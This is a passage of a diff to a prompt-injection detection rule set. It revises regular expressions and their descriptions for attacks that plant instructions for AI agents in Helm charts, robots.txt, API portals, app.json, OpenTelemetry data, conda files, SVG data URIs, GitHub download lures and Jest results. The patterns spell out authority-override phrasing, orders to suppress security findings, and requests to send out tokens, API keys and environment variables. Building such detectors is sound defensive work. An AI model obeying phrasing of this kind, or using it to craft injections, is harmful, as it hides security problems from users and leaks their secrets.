\s+(?:project|security|governing|policy))?(?:\s+(?:description|policy|document))?|definitive(?:\s+(?:project|model\s+evaluation))?(?:\s+(?:description|policy))?|(?:primary|single)\s+source\s+of\s+truth|controlling\s+document|is\s+the\s+final\s+word|defines\s+all\s+scanner\s+rules?|(?:agent|scanner|assistant|verifier|crawler)\s+instructions?|(?:agent|scanner|assistant|verifier|crawler)[._](?:policy|instructions?|note))\b|\b(?:suppress(?:es|ed|ing)?\b.{0,40}?\b(?:findings?|warnings?|alerts?|reports?|flags?)|hide\b.{0,40}?\b(?:findings?|warnings?|alerts?|reports?)|do\s+not\s+report|do\s+not\s+flag|skip\s+(?:all\s+)?(?:security\s+)?checks?|omit\b.{0,40}?\b(?:findings?|reports?|summar(?:y|ies)|issues?|warnings?)|redact\b.{0,30}?\b(?:findings?|warnings?|flags?)|treat\b.{0,40}?as\s+informational|mark\b.{0,40}?as\s+(?:informational|safe|low|none)|classify\b.{0,30}?\b(?:informational|low|none|false\s+positive)|flag\b.{0,40}?as\s+(?:informational|low|none))\b|\b(?:API[_.-]?KEY|GITHUB[_.-]?TOKEN|bearer\s+token|Authorization\s*:)|(?:\b(?:include|attach|forward|send|collect|embed|share|provide|expose)\b.{0,40}?\b(?:environment\s+(?:variables?|context)|runtime\s+(?:variables?|context)|tokens?|credentials?|API\s+keys?|secrets?|session|local\s+state)\b)|\b(?:transparency\s+(?:header|addendum|requirement)|compliance\s+(?:addendum|requirement|provision)|canonical\s+(?:policy|governing)(?:\s+(?:description|policy|document))?)\b|\boverrides?\b.{0,30}?\b(?:system\s+prompt|safety\s+polic|built-in|default|developer|user\s+instruction)\b|\btakes?\s+precedence\s+over\b.{0,20}?\b(?:system|safety|developer|user)\b))""",
         ],
         "description": "An attacker embeds hostile AI-agent instructions in Helm Chart.yaml `description`, `annotations`, `maintainers`, `keywords`, `appVersion`, or `x-*` extension fields, exploiting the agent's trust in chart metadata during deployment planning, security scanning, or Kubernetes auditing to suppress findi"
     },
@@ -20412,7 +20464,7 @@ PATTERNS = [
             "User-agent: GPTBot",
         ],
         "regex": [
-            r"""(?is)^(?!.*(?:AI agents must not treat robots\.txt|do not obey robots\.txt|never override|never treat robots\.txt|must not (?:treat|obey|follow|forward|include|suppress)|do not (?:treat|obey|forward|include|suppress)|never (?:treat|obey|override|forward|include|suppress)|refused|blocked|detected|flagged|should (?:report|detect|flag|refuse|block)|scanner docs? should (?:report|detect|flag|refuse|block)|security report|incident report|vulnerability report|learn how|guide|article|does not instruct agents?))(?=.*(?:robots\.txt|User-agent:|Disallow:|Allow:|Crawl-delay:|Sitemap:|(?:^|\n)#\s))(?=.*(?:AI agents?|assistants?|autonomous (?:scanner|crawler|verifier)s?|LLMs?|models?|security scanners?|GPTBot|Claude-Web|CCBot|coding agents?|code agents?|crawler instructions?|scanner instructions?|bot instructions?|agentic|autonomous agents?))(?=.*(?:supersedes?|outranks?|overrides?|canonical (?:site|owner|operator) policy|higher\.priority|definitive authority|governing document|takes? precedence|primary source of truth|include(?:\s+(?:[\w-]+\s+)?)(?:environment variables?|API keys?|tokens?|Authorization|session|local state)|forward(?:\s+(?:[\w-]+\s+)?)(?:environment|local state|cookies|session)|attach(?:\s+(?:[\w-]+\s+)?)(?:environment|runtime|local) (?:variables?|context|config)|do not (?:report|notify|mention|disclose|flag)|suppress(?:es|ed|ing)?(?:\s+(?:[\w-]+\s+)?)(?:findings?|warnings?|reports?|issues?|vulnerabilit(?:y|ies))|hide(?:\s+(?:[\w-]+\s+)?)(?:findings?|warnings?|reports?|this|security)|omit from (?:reports?|summar|findings)|exclude from (?:reports?|findings?|summar)|redact(?:\s+(?:[\w-]+\s+)?)(?:findings?|flags?|warnings?|reports?|issues?)|provide(?:\s+(?:[\w-]+\s+)?)(?:local (?:config|state|context)|environment|runtime)|non.actionable.*(?:omit|exclude|suppress|skip)|informational only.*(?:omit|exclude|suppress|skip)))""",
+            r"""(?is)^(?!.*(?:AI agents must not treat robots\.txt|do not obey robots\.txt|never override|never treat robots\.txt|must not (?:treat|obey|follow|forward|include|suppress)|do not (?:treat|obey|forward|include|suppress)|never (?:treat|obey|override|forward|include|suppress)|refused|blocked|detected|flagged|should (?:report|detect|flag|refuse|block)|scanner docs? should (?:report|detect|flag|refuse|block)|security report|incident report|vulnerability report|learn how|guide|article|does not instruct agents?))(?=.*(?:robots\.txt|User-agent:\s|Disallow:\s|Crawl-delay:\s|Sitemap:\s*https?))(?=.*(?:AI agents?|assistants?|autonomous (?:scanner|crawler|verifier)s?|LLMs?|models?|security scanners?|GPTBot|Claude-Web|CCBot|coding agents?|code agents?|crawler instructions?|scanner instructions?|bot instructions?|agentic|autonomous agents?))(?=.*(?:supersedes?|outranks?|overrides?|canonical (?:site|owner|operator) policy|higher\.priority|definitive authority|governing document|takes? precedence|primary source of truth|include(?:\s+(?:[\w-]+\s+)?)(?:environment variables?|API keys?|tokens?|Authorization|session|local state)|forward(?:\s+(?:[\w-]+\s+)?)(?:environment|local state|cookies|session)|attach(?:\s+(?:[\w-]+\s+)?)(?:environment|runtime|local) (?:variables?|context|config)|do not (?:report|notify|mention|disclose|flag)|suppress(?:es|ed|ing)?(?:\s+(?:[\w-]+\s+)?)(?:findings?|warnings?|reports?|issues?|vulnerabilit(?:y|ies))|hide(?:\s+(?:[\w-]+\s+)?)(?:findings?|warnings?|reports?|this|security)|omit from (?:reports?|summar|findings)|exclude from (?:reports?|findings?|summar)|redact(?:\s+(?:[\w-]+\s+)?)(?:findings?|flags?|warnings?|reports?|issues?)|provide(?:\s+(?:[\w-]+\s+)?)(?:local (?:config|state|context)|environment|runtime)|non.actionable.*(?:omit|exclude|suppress|skip)|informational only.*(?:omit|exclude|suppress|skip)))""",
         ],
         "description": "`robots.txt` is the most universally consumed machine-readable policy file on the web. Attackers can embed agent-targeting instructions in comments, custom directives, `Sitemap:` pointers, and `User-agent:` sections that AI agents ingest as trusted site policy \u2014 enabling authority inversion, credent"
     },
@@ -21222,7 +21274,12 @@ PATTERNS = [
         "regex": [
             r"""(?six)^
 (?!.*(?:\b(?:security\s+(?:training|guide|reference)|scanner\s+docs?|defensive\s+example|incident\s+report|quoted\s+attack|do\s+not\s+(?:obey|follow|trust|treat|use|save|persist|store|write)|does\s+not\s+(?:obey|follow|trust|treat|use|override|instruct)|never\s+(?:obey|trust|treat|use|override|forward|include)|must\s+not\s+(?:obey|trust|treat|use|override|forward|include)|should\s+(?:report|detect|flag|refuse|block|not\s+\w+|never\b)|must\s+be\s+reported|not\s+obeyed).{0,180}?\b(?:api\s+(?:portal|catalog|reference|docs?|documentation)|developer\s+portal|stoplight|readme(?:\.com)?|redocly|endpoint\s+catalog)\b|\b(?:api\s+(?:portal|catalog|reference|docs?|documentation)|developer\s+portal|stoplight|readme(?:\.com)?|redocly|endpoint\s+catalog)\b.{0,180}?\b(?:do\s+not|does\s+not|never|should\s+never|must\s+not)\b.{0,80}?\b(?:override|suppress|forward|include|obey|treat)\b))
-(?=.*(?:\b(?:stoplight|readme(?:\.com)?|redocly|api\s+(?:portal|catalog|reference|documentation|docs)|developer\s+portal|generated\s+api\s+(?:docs|reference)|reference\s+page|operation\s+reference|endpoint\s+catalog|externalDocs|api\s+styleguide|docs\s+portal)\b|(?<!\w)"(?:description|summary|externalDocs|markdown|docs|x-agent-policy|scanner_policy|agent_instructions|assistant_note)"\s*:))
+# Carrier anchor (Jul-11, FP sprint): portal vocab accepted bare 'readme'
+# and 'api reference|documentation|docs' — words every API-client README
+# contains (axios, fastapi, openai-python; 5/43 famous-README FPs). Portal
+# carrier = portal PRODUCTS (stoplight/readme.com/redocly), portal metadata
+# fields, or explicit portal/catalog phrases — not generic docs words.
+(?=.*(?:\b(?:stoplight|readme\.com|redocly|api\s+(?:portal|catalog)|developer\s+portal|generated\s+api\s+(?:docs|reference)|operation\s+reference|endpoint\s+catalog|externalDocs|api\s+styleguide|docs\s+portal)\b|(?<!\w)"(?:description|summary|externalDocs|markdown|docs|x-agent-policy|scanner_policy|agent_instructions|assistant_note)"\s*:))
 (?=.*(?<![A-Za-z0-9])(?:ai\s+agents?|api\s+agents?|llm\s+agents?|assistants?|coding\s+agents?|security\s+scanners?|api\s+scanners?|scanners?|mcp\s+(?:bridge\s+)?builders?|tool\s+builders?|automated\s+(?:api\s+)?(?:review|audit|verification)|agents?|reviewers?)(?![A-Za-z0-9])|(?=.*(?<![A-Za-z0-9])(?:agent_instructions?|scanner_policy|assistant_note|agent\s+instructions?|scanner\s+instructions?)(?![A-Za-z0-9])))
 (?=.*(?:
   (?:overrides?|supersed(?:e|es|ed|ing)|takes?\s+precedence|outranks?|overrules?).{0,80}?(?:system|developer|scanner|security|local).{0,40}?(?:rules?|polic(?:y|ies)|instructions?)
@@ -21744,7 +21801,7 @@ PATTERNS = [
 (?!.*\b(?:do\s+not|does\s+not|never|must\s+not|should\s+never|should\s+not)\s+(?:obey|follow|treat|trust|use|include|attach|forward|send|share|override|overrides?|supersede|supersedes|instruct)\b.{0,180}?\b(?:app\.json|Heroku|Dokku|app\s+manifest|deployment\s+manifest)\b)
 (?!.*\b(?:app\.json|Heroku|Dokku|app\s+manifest|deployment\s+metadata)\b.{0,180}?\b(?:is|are)\s+not\s+(?:authoritative|policy|instructions?)\b)
 (?!.*\bno\s+(?:policy\s+)?overrides?\b)
-(?=.*(?:\bapp\.json\b|\b(?:Heroku|Dokku)\s+app\s+manifest\b|\bapp\s+manifest\b|\bdeployment\s+manifest\b|(?<!\w)"(?:name|description|env|addons|scripts|formation|buildpacks|stack|keywords|repository|success_url|postdeploy|agent_policy|scanner_policy|assistant_note)"\s*:|\bReview\s+Apps?\b|\bpostdeploy\b|\bbuildpacks\b))
+(?=.*(?:\bapp\.json\b|\b(?:Heroku|Dokku)\s+app\s+manifest\b|\bdeployment\s+manifest\b|(?<!\w)"(?:addons|formation|buildpacks|stack|success_url|postdeploy|agent_policy|scanner_policy|assistant_note)"\s*:|\bReview\s+Apps?\b|\bpostdeploy\b|\bbuildpacks\b))
 (?=.*(?:\b(?:ai\s+agents?|agents?|assistants?|llms?|models?|codex|copilot|cursor|claude)\b|\b(?:deployment|devops|security|app|release|platform|heroku|dokku)\s+(?:agents?|assistants?|scanners?|reviewers?|auditors?|verifiers?)\b|\bautomated\s+(?:(?:deployment|security|release|app|platform|heroku|dokku)\s+)?(?:review|audit|scan|verification)\b|(?<![a-zA-Z0-9])(?:agent_instructions|assistant_note|scanner_policy|agent_policy)(?![a-zA-Z0-9])))
 (?=.*(?:\b(?:authoritative|governing\s+document|controlling\s+document|takes?\s+precedence|overrides?|outranks?|supersed(?:e|es|ed|ing)?|(?:primary|single)\s+source\s+of\s+truth|canonical|definitive)\b|\b(?:main|primary|principal|preferred|recommended)\s+(?:(?:heroku|dokku|app|deployment|release|platform|security|review|audit|verification)\s+){0,4}(?:operating\s+)?(?:guidance|playbook|runbook|procedure|process|policy)\b|\bdefines?\s+(?:(?:all|the)\s+)?(?:(?:scanner|security|agent|deployment|release|review)\s+){1,3}rules?\b|\b(?:agent|scanner|assistant|deployment|release)\s+(?:instructions?|policy|directive|note)\b|(?<![a-zA-Z0-9])(?:agent_instructions|assistant_note|scanner_policy|agent_policy)(?![a-zA-Z0-9])))
 (?=.*(?:\b(?:suppress|hide|omit|exclude|redact|downgrade|deprioritize|demote|reclassify|skip)\s+(?:[\w-]+\s+){0,4}(?:findings?|warnings?|alerts?|reports?|flags?|issues?|vulnerabilit(?:y|ies)|observations?|results?|diagnostics?|checks?|port\s+findings?|dyno\s+findings?|review\s+apps?\s+findings?)\b|\b(?:do\s+not|don't|not)\s+(?:report|flag|escalate)\s+(?:[\w-]+\s+){0,4}(?:findings?|warnings?|alerts?|issues?|observations?|diagnostics?)\b|\b(?:treat|mark|classify|consider)\b.{0,60}?\b(?:as\s+)?(?:informational|non-blocking|advisory-only|safe|clean|benign|background-only)\b|\b(?:keep|leave)\s+(?:[\w-]+\s+){0,5}(?:findings?|warnings?|alerts?|issues?|observations?|diagnostics?|results?)\s+out\s+of\s+(?:the\s+)?(?:report|summary|memo|audit|review|final\s+report|release\s+memo)\b|\b(?:findings?|warnings?|alerts?|issues?|observations?|diagnostics?|results?)\s+(?:are|is|were|was|should\s+be|must\s+be)\s+(?:not\s+)?(?:suppressed|hidden|omitted|excluded|redacted|downgraded|treated|considered|classified)\b|\b(?:include|attach|forward|send|share|provide|expose|collect|copy|read|populate|pass\s+along|hand\s+off|relay|transfer)\s+(?:[\w-]+\s+){0,6}(?:api\s+tokens?|session\s+tokens?|auth(?:orization)?\s+headers?|credentials?|secrets?|HEROKU_API_KEY|DOKKU_TOKEN|heroku\s+tokens?|platform\s+api\s+keys?|config\s+vars?|environment\s+(?:variables?|context|details?|config(?:uration)?|settings?)|runtime\s+(?:context|config(?:uration)?|settings?|state|details?|artifacts?|material)|local\s+(?:state|config(?:uration)?|settings?|context)|ci\s+(?:tokens?|context|variables?))\b))
@@ -22137,7 +22194,7 @@ PATTERNS = [
         "regex": [
             r"""(?six)^
 (?!.*(?:\b(?:security\s+guide|scanner\s+docs?|training|reference\s+docs?)\b.{0,180}\b(?:should|must|will|was|were)\s+(?:report|detect|flag|refuse|block|blocked|detected)|\bincident\s+report\b.{0,220}\b(?:detected|blocked|refused|flagged)\b|\b(?:do\s+not|does\s+not|never|must\s+not|should\s+never)\s+(?:treat|obey|follow|trust|use|include|forward|send|share|override)\b.{0,140}\b(?:OpenTelemetry|OTel|trace|span|baggage|telemetry)|\b(?:trace|span|baggage|telemetry)\s+metadata\s+(?:is|are)\s+not\s+(?:policy|authoritative|trusted)))
-(?=.*(?:\bOpenTelemetry\b|\bOTel\b|\bOTLP\b|traceparent|tracestate|\bbaggage\b|span\s+attributes?|resource\s+attributes?|trace\s+attributes?|log\s+attributes?|telemetry\s+(?:attributes?|metadata)|observability\s+(?:trace|telemetry)|"attributes"\s*:|service\.name|trace[_-]?id|span[_-]?id))
+(?=.*(?:\bOpenTelemetry\b|\bOTel\b|\bOTLP\b|traceparent|tracestate|\bbaggage\b|span\s+attributes?|resource\s+attributes?|trace\s+attributes?|log\s+attributes?|telemetry\s+(?:attributes?|metadata)|observability\s+(?:trace|telemetry)|service\.name))
 (?=.*(?<![A-Za-z0-9])(?:ai\s+agents?|incident\s+(?:agents?|bots?)|assistants?|autonomous\s+(?:agents?|scanners?)|security\s+scanners?|review\s+bots?|verifiers?|auditors?|sre\s+(?:agents?|bots?)|agent\s+(?:instructions?|policy|note)|scanner\s+(?:instructions?|policy|notes?)|for\s+agents?|automated\s+(?:incident\s+)?(?:review|triage|audit|scan|verification))(?![A-Za-z0-9]))
 (?=.*(?:(?:primary|single)\s+source\s+of\s+truth|(?:authoritative|canonical|definitive|governing|controlling|preferred|recommended)\s+(?:telemetry\s+|triage\s+|incident\s+|scanner\s+)?(?:policy|guidance|document|runbook|playbook)|takes\s+precedence|overrides?|supersedes?|outranks?|overrules?|defines?\s+(?:all\s+)?(?:scanner|security|agent|triage)\s+rules?|(?:agent|scanner|assistant|verifier)\s+(?:instructions?|policy|notes?)|per\s+(?:policy|requirements?)|pursuant\s+to|in\s+accordance\s+with|suppress(?:es|ed|ing)?\s+(?:[\w-]+\s+){0,3}(?:findings?|warnings?|reports?|alerts?|flags?|observations?|diagnostics?|incidents?)|(?:findings?|warnings?|reports?|alerts?|flags?|observations?|diagnostics?|incidents?)\s+(?:are|were|must\s+be|should\s+be)\s+(?:suppressed|hidden|omitted|excluded|redacted)|(?:hide|omit|exclude|redact|skip|downgrade|deprioritize|classify|calibrate)\s+(?:[\w-]+\s+){0,4}(?:findings?|warnings?|reports?|alerts?|flags?|observations?|diagnostics?|incidents?)|do\s+not\s+(?:report|flag|include)\b|treat.{0,60}?as\s+(?:informational|non[-\s]?blocking|safe|clean|benign|advisory[-\s]?only|background[-\s]?only)|mark.{0,60}?as\s+(?:safe|clean|benign)|(?:include|attach|forward|send|share|provide|expose|collect|pass\s+along|hand\s+over|relay)\s+(?:[\w-]+\s+){0,6}(?:api\s+tokens?|session\s+keys?|environment\s+(?:variables?|context|details?|config(?:uration)?|settings?)|env\s+vars?|local\s+(?:state|config(?:uration)?|settings?)|runtime\s+(?:context|config(?:uration)?|settings?|details?)|credentials?|auth(?:orization)?\s+headers?|trace\s+secrets?|baggage\s+tokens?)))
 .*""",
@@ -22706,7 +22763,7 @@ PATTERNS = [
         "regex": [
             r"""(?six)^
 (?!.*\b(?:do\s+not\s+(?:obey|follow|treat|trust|use|include|attach|forward|send|share|expose|override)|does\s+not\s+(?:obey|follow|treat|trust|override|instruct|authorize)|never\s+(?:obey|follow|treat|trust|override|include|expose|forward)|must\s+not\s+(?:obey|follow|treat|trust|override|include|forward)|should\s+(?:not\s+\w+|never\b|report|detect|flag|refuse|block)|not\s+(?:authoritative|canonical|definitive)|no\s+(?:policy\s+)?overrides?|(?:security|incident|vulnerability)\s+report.{0,140}?(?:detected|blocked|flagged|refused)|scanners?\s+docs?\s+should\s+(?:report|detect|flag|refuse)|(?:training|guide|reference|documentation).{0,140}?(?:must\s+not|should\s+not|never)\s+(?:obey|treat|use|include|expose)))
-(?=.*(?:(?<![A-Za-z0-9])(?:environment\.ya?ml|conda\s+environment|conda\s+env\s+export|conda-lock|mamba\s+environment|mamba\.ya?ml|pixi\s+environment|x-conda-agent-policy|environment\s+descriptor)(?![A-Za-z0-9])|(?:^|\n)\s*(?:name|channels|dependencies|variables|prefix)\s*:|(?<!\w)"(?:name|channels|dependencies|variables|prefix|x-conda-agent-policy|agent_instructions|scanner_policy)"\s*:))
+(?=.*(?:(?<![A-Za-z0-9])(?:environment\.ya?ml|conda\s+environment|conda\s+env\s+export|conda-lock|mamba\s+environment|mamba\.ya?ml|pixi\s+environment|x-conda-agent-policy|environment\s+descriptor)(?![A-Za-z0-9])|(?:^|\n)\s*channels\s*:\s*\n\s*-\s|(?<!\w)"(?:name|channels|dependencies|variables|prefix|x-conda-agent-policy|agent_instructions|scanner_policy)"\s*:))
 (?=.*(?<![A-Za-z0-9])(?:ai\s+agents?|coding\s+agents?|dependency\s+(?:agents?|reviewers?|auditors?)|security\s+scanners?|conda\s+(?:agents?|auditors?|scanners?)|automated\s+(?:dependency\s+)?(?:review|audit|scan|verification)|scanners?|auditors?|assistants?|reviewers?|agents?|llms?)(?![A-Za-z0-9])|(?=.*(?:agent|scanner|assistant|auditor|reviewer)[_-](?:policy|instructions?|note|directive)))
 (?=.*(?:\b(?:authoritative|canonical|definitive)\b|(?:primary|single)\s+source\s+of\s+truth|(?:main|primary|preferred|recommended|principal)\s+(?:(?:conda|mamba|dependency|environment|package|security|review|audit|verification|operating)\s+){0,4}(?:guidance|policy|playbook|runbook|procedure|process|instructions?)|(?:agent|scanner|assistant|auditor|reviewer)\s+(?:instructions?|directive|policy|note)|for\s+(?:AI\s+)?(?:agents?|scanners?|assistants?).{0,30}?\bthis\b|overrides?|supersed(?:e|es|ed|ing)|takes?\s+precedence|outranks?|defines?\s+(?:all\s+)?(?:scanner|security|dependency|conda|review)\s+rules?|suppress(?:es|ed|ing)?|hide|redact|omit|exclude|downgrade|deprioriti[sz]e|ignore|skip|do\s+not\s+report|not\s+report|treat.{0,80}?as\s+(?:informational|advisory-only|non-blocking|safe|clean|background-only)|(?:observations?|findings?|diagnostics?|results?|warnings?|alerts?)\s+(?:are|is|should\s+be)\s+(?:considered|treated|classified|marked|seen|viewed)\s+(?:as\s+)?(?:advisory-only|informational|non-blocking|background-only|secondary)|(?:keep|leave).{0,100}?out\s+of.{0,50}?(?:reports?|summar(?:y|ies)|memos?|audit\s+memo|final\s+report)|(?:place|put|route|move|shift).{0,90}?(?:observations?|findings?|diagnostics?|results?|issues?|warnings?).{0,70}?(?:supplementary|appendix|background|informational|side\s+notes?|secondary)|(?:include|forward|send|attach|provide|share|collect|copy|read|export|transfer|hand\s+off|pass\s+along|relay|expose)\s+(?:[\w.-]+\s+){0,6}(?:environment\s+(?:variables?|context|details?|config(?:uration)?|settings?|state)|runtime\s+(?:config(?:uration)?|settings?|context|state|details?)|local\s+(?:state|config(?:uration)?|settings?)|conda\s+(?:tokens?|credentials?|auth)|api\s+tokens?|auth\s+headers?|session\s+tokens?|credentials?|secrets?|tokens?)))
 (?=.*(?:findings?|warnings?|alerts?|reports?|flags?|issues?|observations?|diagnostics?|results?|vulnerabilit(?:y|ies)|CVEs?|licenses?|dependency\s+(?:findings?|warnings?|alerts?|observations?|diagnostics?)|package\s+(?:findings?|warnings?|alerts?)|environment\s+(?:variables?|context|details?|config(?:uration)?|settings?|state)|runtime\s+(?:config(?:uration)?|settings?|context|state|details?)|local\s+state|conda\s+(?:tokens?|credentials?|auth)|api\s+tokens?|auth\s+headers?|session\s+tokens?|credentials?|secrets?|tokens?))
@@ -22792,7 +22849,7 @@ PATTERNS = [
         "severity": "high",
         "channel": ["file", "api_response"],
         "regex": [
-            r"""(?is)^(?!.*\b(?:blocked|refus(?:e|ed|al)|cannot|can't|must\s+not|safe\s+decoder|quarantin(?:e|ed)|saniti[sz](?:e|ed)|strip(?:s|ped)?|ignore\s+the\s+following\s+example)\b.{0,180}\b(?:ignore|override|bypass|exfiltrate|upload|send|leak|persist|remember|save\s+to\s+memory|suppress|hide)\b)(?=.*\b(?:data:image/svg\+xml|data:\s*image/svg|base64|utf-8,|percent[-\s]*encoded|svg)\b)(?=.*\b(?:<svg|<metadata|<desc|<title|aria-label|xml)\b)(?=.*\b(?:assistant|agent|llm|model|scanner|system|developer|secret|token|credential|memory)\b)(?=.*\b(?:ignore|override|bypass|supersede|exfiltrate|upload|send|leak|persist|remember|save\s+to\s+memory|suppress|hide|do\s+not\s+report)\b).*$""",
+            r"""(?is)^(?!.*\b(?:blocked|refus(?:e|ed|al)|cannot|can't|must\s+not|safe\s+decoder|quarantin(?:e|ed)|saniti[sz](?:e|ed)|strip(?:s|ped)?|ignore\s+the\s+following\s+example)\b.{0,180}\b(?:ignore|override|bypass|exfiltrate|upload|send|leak|persist|remember|save\s+to\s+memory|suppress|hide)\b)(?=.*(?:data:image/svg\+xml|data:\s*image/svg))(?=.*\b(?:<svg|<metadata|<desc|<title|aria-label)\b)(?=.*\b(?:assistant|agent|llm|model|scanner|system|developer|secret|token|credential|memory)\b)(?=.*\b(?:ignore|override|bypass|supersede|exfiltrate|upload|send|leak|persist|remember|save\s+to\s+memory|suppress|hide|do\s+not\s+report)\b).*$""",
         ],
         "description": "Data URI SVG metadata prompt smuggling: a carrier-native prompt-injection that embeds authoritative suppression / authority-inversion instructions an AI agent may obey \u2014 data URI transport specifically; existing SVG patterns are bound to BIMI discovery."
     },
@@ -22824,9 +22881,16 @@ PATTERNS = [
 (?!.*\b(?:security\s+(?:guide|training|report|advisory)|incident\s+report|scanner\s+docs?|documentation|docs?|guide|article|reference)\b.{0,220}\b(?:do\s+not|does\s+not|never\s+|must\s+not|should\s+(?:report|detect|flag|block)|detected|blocked|warns?|refused)\b)
 (?!.*\b(?:tests?|unit\s+tests?|fixtures?)\b.{0,180}\b(?:fixtures?\s+only|no\s+(?:install|setup|download)|not\s+(?:for\s+)?(?:install|setup|download))\b)
 (?!.*\b(?:signed\s+github\s+release|release\s+asset.{0,100}(?:sha256|signature|signed)|package\s+manager\s+install|npm\s+install|pip\s+install|cargo\s+install|brew\s+install|checksum\s+verified)\b)
-(?=.*(?:\b(?:README|repo(?:sitory)?|source[-\s]?tree|zip_path|download_url|pushed_at|updated_at)\b|raw\.githubusercontent\.com|github\.com/[^\s]+/(?:blob|raw)/|(?:^|[\s"'=:])(?:docs?|examples?|internal|assets?|scripts?|patterns|tests|frontend/src|sentinel/rules|site/\.well-known)/))
+# Carrier anchor (Jul-11, FP sprint): fetch-machinery + payload groups used to
+# accept passive REFERENCE links — a raw.githubusercontent badge image or a
+# github blob citation satisfied BOTH, and any dev script (.sh) counted as the
+# payload (10/43 famous-README FPs: numpy fired on its logo badge URL alone).
+# The lure's real signature: machine fetch-fields (zip_path/download_url/
+# pushed_at — API-response JSON) OR a direct raw/release ARCHIVE download,
+# plus an archive/installer payload — never a blob citation or a repo script.
+(?=.*(?:\b(?:zip_path|download_url|pushed_at|updated_at|onboarding\s+bundle|bootstrap\s+bundle)\b|(?:raw\.githubusercontent\.com|github\.com)/[^\s"'<>]{1,180}\.(?:zip|tar\.gz|tgz|tar\.xz|7z|rar|exe|msi|dmg|pkg)\b|github\.com/[^\s"'<>]{1,140}/releases/download/))
 (?=.*\b(?:MCP|Model\s+Context\s+Protocol|AI\s+agents?|coding\s+assistants?|prompt\s+injections?|guardrails?|security\s+(?:scanner|checklist|policy|middleware|tool)|firewall|CVE|vulnerabilit(?:y|ies)|sandbox|detectors?|data\s+exfiltration)\b)
-(?=.*(?:\bzip_path\b|\bdownload_url\b|raw\.githubusercontent\.com|github\.com/.{1,140}/(?:raw|blob)/|[\w./-]{1,180}\.(?:zip|tar\.gz|tgz|tar\.xz|7z|rar|exe|msi|dmg|pkg|ps1|sh)\b))
+(?=.*(?:\bzip_path\b|\bdownload_url\b|[\w./-]{1,180}\.(?:zip|tar\.gz|tgz|tar\.xz|7z|rar|exe|msi|dmg|pkg)\b))
 (?=.*\b(?:install|download|open|run|execute|fetch|expand|extract|launch|start|setup|bootstrap|onboarding\s+bundle|helper|release|asset|pushed_at|updated_at)\b)
 [\s\S]+""",
         ],
@@ -23225,7 +23289,7 @@ PATTERNS = [
         "severity": "high",
         "channel": ["file", "api_response"],
         "regex": [
-            r"""(?is)^(?!.*\b(?:incident report|blocked|quarantined|redacted|unit test|fixture|docs?|documentation|runbook|training|detector|scanner should flag|must flag|should flag|do not obey|must not obey|never follow)\b.{0,220}\b(?:agent|assistant|suppress|token|credential|instruction|directive)\b)(?=.*\b(?:jest\s+json|jest\s+--json|--json|testResults|assertionResults|failureMessages?|failureMessage|ancestorTitles|fullName|console|numFailedTests|outputFile)\b|(?=.*\bstatus\b)(?=.*\bfailed\b))(?=.*\b(?:agent|assistant|automated\s+review|test\s+reviewer|ci\s+reviewer|scanner|bot)\b)(?=.*\b(?:directive|instruction|canonical|authoritative|source\s+of\s+truth|override|takes\s+precedence|review\s+policy|policy)\b)(?=.*\b(?:suppress|hide|ignore|omit|downgrade|green\s+path|quiet\s+mode|operator-only|include|forward|exfiltrate|dump|send|relay|pass\s+along|mark\s+(?:the\s+)?(?:suite|tests?|run)\s+pass(?:ed)?|treat\s+(?:failures?|findings|diagnostics)\s+as\s+(?:informational|non[-\s]?blocking)|do\s+not\s+report)\b.{0,100}\b(?:failures?|findings|diagnostics|coverage|tokens?|credentials?|secrets?|env(?:ironment)?(?:\s+variables?)?|api\s*keys?|runtime\s+context|ci\s+variables?)\b).*""",
+            r"""(?is)^(?!.*\b(?:incident report|blocked|quarantined|redacted|unit test|fixture|docs?|documentation|runbook|training|detector|scanner should flag|must flag|should flag|do not obey|must not obey|never follow)\b.{0,220}\b(?:agent|assistant|suppress|token|credential|instruction|directive)\b)(?=.*\b(?:jest\s+json|jest\s+--json|testResults|assertionResults|failureMessages?|ancestorTitles|numFailedTests|numPassedTests|coverageMap)\b)(?=.*\b(?:agent|assistant|automated\s+review|test\s+reviewer|ci\s+reviewer|scanner|bot)\b)(?=.*\b(?:directive|instruction|canonical|authoritative|source\s+of\s+truth|override|takes\s+precedence|review\s+policy|policy)\b)(?=.*\b(?:suppress|hide|ignore|omit|downgrade|green\s+path|quiet\s+mode|operator-only|include|forward|exfiltrate|dump|send|relay|pass\s+along|mark\s+(?:the\s+)?(?:suite|tests?|run)\s+pass(?:ed)?|treat\s+(?:failures?|findings|diagnostics)\s+as\s+(?:informational|non[-\s]?blocking)|do\s+not\s+report)\b.{0,100}\b(?:failures?|findings|diagnostics|coverage|tokens?|credentials?|secrets?|env(?:ironment)?(?:\s+variables?)?|api\s*keys?|runtime\s+context|ci\s+variables?)\b).*""",
         ],
         "description": "Jest JSON Test-Result Poisoning: a carrier-native prompt-injection that embeds authoritative suppression / authority-inversion instructions an AI agent may obey \u2014 jest JSON test results, distinct from general test metadata or logs."
     },
